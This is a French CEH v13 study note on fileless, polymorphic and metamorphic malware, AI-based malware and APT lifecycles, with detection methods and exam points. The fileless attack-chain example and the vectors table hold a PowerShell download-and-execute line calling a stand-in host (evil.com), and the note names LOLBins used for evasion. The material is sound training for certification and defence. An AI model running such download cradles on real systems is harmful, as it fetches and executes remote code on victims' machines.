# 🔬 05 — Techniques Avancées : Fileless, Polymorphique, IA & APT

> **CEH v13 | Module 07 : Malware Threats**  
> 📌 Section 5/8 — Évasion avancée & Menaces persistantes

---

## 🫥 PARTIE 1 : FILELESS MALWARE

### Définition

> Le **malware fileless** (ou sans fichier) est un type d'attaque qui s'exécute **entièrement en mémoire (RAM)** sans écrire de fichier malveillant sur le disque. Il exploite des outils légitimes du système.

---

### 🎯 Pourquoi c'est dangereux ?

```
Malware classique                    Fileless Malware
─────────────────                    ────────────────
  Fichier .exe sur disque              ✅ AUCUN fichier sur disque
  → Détectable par AV signature        → Invisible aux AV signatures
  → Traces forensiques                 → Traces forensiques minimales
  → Supprimable                        → Disparaît au redémarrage*
```

*À moins d'établir une persistance via registre ou WMI*

---

### ⚙️ Vecteurs d'attaque Fileless

| Vecteur | Description | Outil/Technique |
|---------|-------------|----------------|
| **PowerShell** | Scripts malveillants en mémoire | `IEX (New-Object Net.WebClient).DownloadString(url)` |
| **WMI** | Windows Management Instrumentation | Persistance via abonnements WMI |
| **Macros Office** | VBA → appels PowerShell ou WScript | Shellcode injection |
| **LOLBins** | Living-off-the-Land Binaries | `regsvr32`, `mshta`, `certutil`, `rundll32` |
| **Process Injection** | Code injecté dans processus légitimes | DLL injection, Process Hollowing |
| **Registry** | Payload chiffré dans le registre Windows | `HKCU\Software\...` |

---

### 🔄 Exemple de chaîne d'attaque fileless

```
[1] Email phishing → pièce jointe Word avec macro

[2] Macro VBA s'exécute
     └─ Lance PowerShell en mode caché

[3] PowerShell télécharge payload depuis URL
     └─ IEX(New-Object Net.WebClient).DownloadString('http://evil.com/p.ps1')

[4] Payload s'exécute EN MÉMOIRE
     └─ Inject dans processus légitime (ex: explorer.exe)

[5] Établit connexion C2 → accès persistent
     └─ Persistance via WMI ou clé registre Run

✅ Aucun fichier malveillant sur disque !
```

---

### 🛡️ Détection du Fileless Malware

```
Méthodes de détection

├── 🔍 Surveillance PowerShell (Script Block Logging, Transcription)
│    → Activer : HKLM\SOFTWARE\Policies\Microsoft\Windows\PowerShell
│
├── 🔍 Analyse comportementale (EDR)
│    → Détecter injection de processus, accès mémoire suspects
│
├── 🔍 Memory Forensics
│    → Volatility pour analyser la RAM à chaud
│
├── 🔍 SIEM → Alertes sur LOLBins suspects
│    → regsvr32 accédant à Internet = suspect
│
└── 🔍 AMSi (Antimalware Scan Interface)
     → Windows 10+ : scan des scripts en mémoire avant exécution
```

---

## 🦎 PARTIE 2 : MALWARE ÉVASIF (Polymorphique & Métamorphique)

### Polymorphic Malware

> Se **réencrypte** avec une clé différente à chaque copie. Le **comportement reste identique**, seule la **signature change**.

```
┌─────────────────────────────────────────────────┐
│  POLYMORPHIC ENGINE                             │
│                                                 │
│  CODE MALVEILLANT ──→ CRYPTER ──→ SIGNATURE A   │
│       (fixe)                                    │
│                   ──→ CRYPTER ──→ SIGNATURE B   │
│                                                 │
│  → AV signature-based : inefficace              │
│  → AV comportemental : peut détecter            │
└─────────────────────────────────────────────────┘
```

### Metamorphic Malware

> **Réécrit entièrement** son code à chaque génération. Ni la signature ni la structure ne restent identiques.

```
┌─────────────────────────────────────────────────┐
│  METAMORPHIC ENGINE                             │
│                                                 │
│  CODE v1 → [Mutation totale] → CODE v2          │
│            (même logique)                       │
│  CODE v2 → [Mutation totale] → CODE v3          │
│                                                 │
│  → Beaucoup plus difficile à détecter           │
│  → Nécessite analyse comportementale avancée    │
└─────────────────────────────────────────────────┘
```

### Armored Malware

> Utilise des techniques **anti-analyse** pour frustrer les chercheurs en sécurité.

| Technique | Description |
|-----------|-------------|
| **Anti-debugging** | Détecte si tournant dans debugger (IsDebuggerPresent) |
| **Anti-VM** | Détecte environnement virtualisé / sandbox |
| **Code obfuscation** | Code intentionnellement complexe à lire |
| **Packing** | Compresse/chiffre le binaire |
| **Anti-disassembly** | Perturbe les désassembleurs (fausses instructions) |

---

## 🤖 PARTIE 3 : AI-BASED MALWARE (CEH v13 — NOUVEAU)

> Le CEH v13 introduit le concept de **malwares utilisant l'IA** pour augmenter leur efficacité.

### Applications de l'IA dans les malwares

| Capacité | Description |
|---------|-------------|
| **Mutation intelligente** | IA génère des variantes polymorphiques plus efficaces |
| **Ciblage adaptatif** | Sélectionne les victimes les plus vulnérables |
| **Deepfake phishing** | Génère emails/voix/vidéos convaincants |
| **Bypass AV** | IA teste variantes jusqu'au bypass de l'AV |
| **Comportement humain** | Mimique comportement humain pour éviter détection |
| **Auto-propagation** | Décide du meilleur moment/cible pour se propager |

### Défense contre AI Malware
- **AI-powered EDR** : détection comportementale assistée par ML
- **Zero Trust** : vérification continue
- **Threat hunting proactif**

---

## 🕵️ PARTIE 4 : APT — Advanced Persistent Threats

### Définition

> Une **APT** est une attaque sophistiquée, **longue durée** (mois/années), ciblée, généralement sponsorisée par un **État-nation** ou un groupe criminel organisé.

---

### 🔄 Cycle de vie d'une APT

```
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
         CYCLE DE VIE APT (7 phases)
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

[1] Préparation / Reconnaissance
     └─ OSINT, ciblage spécifique, étude de la cible

[2] Intrusion initiale
     └─ Spear phishing, exploit 0-day, supply chain

[3] Établissement de la présence
     └─ Installation backdoor, accès persistant

[4] Escalade de privilèges
     └─ Exploiter vulnérabilités pour obtenir droits admin

[5] Reconnaissance interne (Lateral Movement)
     └─ Cartographier le réseau, trouver données critiques

[6] Exfiltration
     └─ Vol discret de données sur longue période

[7] Maintien de l'accès
     └─ Rester caché, plusieurs backdoors de secours

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
```

---

### 🌍 APT célèbres

| Groupe APT | Origine supposée | Attaque notable |
|-----------|-----------------|----------------|
| **APT28 (Fancy Bear)** | Russie | Élections US 2016, OTAN |
| **APT29 (Cozy Bear)** | Russie | SolarWinds supply chain |
| **APT1 (Comment Crew)** | Chine | Vol PI massif entreprises US |
| **Lazarus Group** | Corée du Nord | Sony Pictures, Bangladesh Bank |
| **Equation Group** | USA/NSA | Stuxnet, EternalBlue |

---

### 🆚 APT vs Attaque classique

| Critère | Attaque classique | APT |
|---------|------------------|-----|
| **Durée** | Heures / Jours | Mois / Années |
| **Cible** | Aléatoire | Très spécifique |
| **Objectif** | Profit rapide | Espionnage / Sabotage |
| **Sophistication** | Faible-Moyenne | Très haute |
| **Ressources** | Individu | État / Organisation |
| **Discrétion** | Faible | Extrême |

---

## 📌 Points clés examen

> ⚠️ **Questions fréquentes :**

- **Fileless malware** = aucun fichier sur disque, s'exécute en RAM via **PowerShell, WMI**
- **LOLBins** = binaires légitimes Windows détournés (`regsvr32`, `mshta`, `certutil`)
- **Polymorphique** = même comportement, signature différente
- **Métamorphique** = code entièrement réécrit à chaque génération
- **APT** = longue durée, ciblé, discret, souvent state-sponsored
- **Stuxnet** = exemple parfait d'APT (ciblage SCADA, Iran)
- CEH v13 ajoute **AI-based malware** comme vecteur émergent

---

## 🔗 Navigation

| ← Précédent | Suivant → |
|-------------|-----------|
| [04 — Ransomware & Rootkits](./04_Ransomware_et_Rootkits.md) | [06 — Analyse Malware](./06_Analyse_Malware.md) |
